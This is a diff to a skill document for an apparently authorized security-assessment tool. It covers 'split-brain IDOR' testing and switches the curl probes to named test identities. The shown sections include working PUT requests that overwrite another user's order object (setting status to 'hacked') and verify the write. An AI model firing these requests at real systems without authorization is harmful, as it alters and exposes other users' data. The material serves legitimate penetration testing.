@@ -2,11 +2,14 @@
 name: split-brain-idor
 description: Test for body/route parameter divergence where the server uses a different object identifier than the one validated in the URL path
 origin: Vigil
+vuln_class: idor
 ---
 
 # Split-Brain IDOR Testing
 
 > **`vigil assess kali` audit flags:** use `--technique IDOR` for all split-brain identity probes. Use `--probe-kind payload` for divergence testing, `--probe-kind exploit` for confirmed unauthorized access demonstrations.
+>
+> **Named identities (use `--identity`, not hand-pasted tokens).** Split-brain IDOR is inherently a **two-user** test: User A's URL (passes auth) + User B's body (hits B's object). Register each account in `auth.json` as a named identity (`user_a`, `user_b`) and run every probe through `vigil assess kali exec --identity user_a -- curl ...` instead of inlining `Cookie: session=USER_A_TOKEN`. The identity name is stamped as the probe's `auth_context`, so the depth ledger registers a real **cross-identity** access-control pass — replaying the divergence test under ≥2 distinct identities is exactly what makes access-control depth count.
 
 ## When to Activate
 
@@ -29,8 +32,8 @@ This is distinct from standard IDOR because the application may correctly enforc
 
 ## Tools
 
-- `vigil assess kali exec -- curl ...` for all probing (mandatory audit pipeline)
-- Two test accounts with distinct object IDs
+- `vigil assess kali exec --identity <name> -- curl ...` for all probing (mandatory audit pipeline; `--identity` selects + stamps the named identity)
+- Two test accounts with distinct object IDs, registered as named identities (`user_a`, `user_b`) in `auth.json`
 - Mitmproxy or browser DevTools for observing request/response shapes
 
 ---
@@ -109,28 +112,32 @@ vigil assess classify-payload 1042 --mutations          # escalation: '1' '0' 'a
 
 **Setup:** User A owns Object A. User B owns Object B.
 
+All three steps run AS `user_a` (the attacker identity). `--identity user_a` selects user_a's
+auth material and stamps the probe — no hand-pasted `Cookie: session=` token. Steps 2/3 are the
+cross-identity pass (attacker user_a reaching user_b's object).
+
 ```bash
-# Step 1: Baseline — User A updates their own object (should succeed)
-curl -X PUT https://target/api/orders/OBJECT_A_ID \
-  -H "Cookie: session=USER_A_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"_id": "OBJECT_A_ID", "status": "updated"}'
+# Step 1: Baseline — user_a updates their own object (should succeed)
+vigil assess kali exec --technique IDOR --probe-kind payload --identity user_a -- \
+  curl -X PUT https://target/api/orders/OBJECT_A_ID \
+    -H "Content-Type: application/json" \
+    -d '{"_id": "OBJECT_A_ID", "status": "updated"}'
 # Expected: 200 OK, Object A updated
 
-# Step 2: Standard IDOR test — User A targets User B's object via URL
-curl -X PUT https://target/api/orders/OBJECT_B_ID \
-  -H "Cookie: session=USER_A_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"_id": "OBJECT_B_ID", "status": "updated"}'
-# Expected if IDOR-protected: 403 Forbidden (User A doesn't own Object B)
+# Step 2: Standard IDOR test — user_a targets user_b's object via URL
+vigil assess kali exec --technique IDOR --probe-kind payload --identity user_a -- \
+  curl -X PUT https://target/api/orders/OBJECT_B_ID \
+    -H "Content-Type: application/json" \
+    -d '{"_id": "OBJECT_B_ID", "status": "updated"}'
+# Expected if IDOR-protected: 403 Forbidden (user_a doesn't own Object B)
 
-# Step 3: SPLIT-BRAIN TEST — User A's URL (passes auth) + User B's body (hits B's data)
-curl -X PUT https://target/api/orders/OBJECT_A_ID \
-  -H "Cookie: session=USER_A_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"_id": "OBJECT_B_ID", "status": "hacked"}'
+# Step 3: SPLIT-BRAIN TEST — user_a's URL (passes auth) + user_b's body (hits B's data)
+vigil assess kali exec --technique IDOR --probe-kind payload --identity user_a -- \
+  curl -X PUT https://target/api/orders/OBJECT_A_ID \
+    -H "Content-Type: application/json" \
+    -d '{"_id": "OBJECT_B_ID", "status": "hacked"}'
 # VULNERABLE if: 200 OK and Object B is modified
-# The URL passes ownership check (User A owns A), but the body ID hits Object B
+# The URL passes ownership check (user_a owns A), but the body ID hits Object B
 ```
 
 ### 2.2 Variant: Body ID Different from Route ID
@@ -184,14 +191,14 @@ curl -X PUT https://target/api/orders/OBJECT_A_ID \
 ### 3.1 Verify the Write Landed on Victim's Object
 
 ```bash
-# As User B (the victim), check if their object was modified
-curl https://target/api/orders/OBJECT_B_ID \
-  -H "Cookie: session=USER_B_TOKEN"
+# As user_b (the victim), check if their object was modified
+vigil assess kali exec --technique IDOR --probe-kind payload --identity user_b -- \
+  curl https://target/api/orders/OBJECT_B_ID
 # If status shows "hacked" → confirmed write to victim's object
 
-# Or as User A, if the endpoint allows reading by ID:
-curl https://target/api/orders/OBJECT_B_ID \
-  -H "Cookie: session=USER_A_TOKEN"
+# Or as user_a, if the endpoint allows reading by ID:
+vigil assess kali exec --technique IDOR --probe-kind payload --identity user_a -- \
+  curl https://target/api/orders/OBJECT_B_ID
 ```
 
 ### 3.2 Demonstrate Meaningful Impact
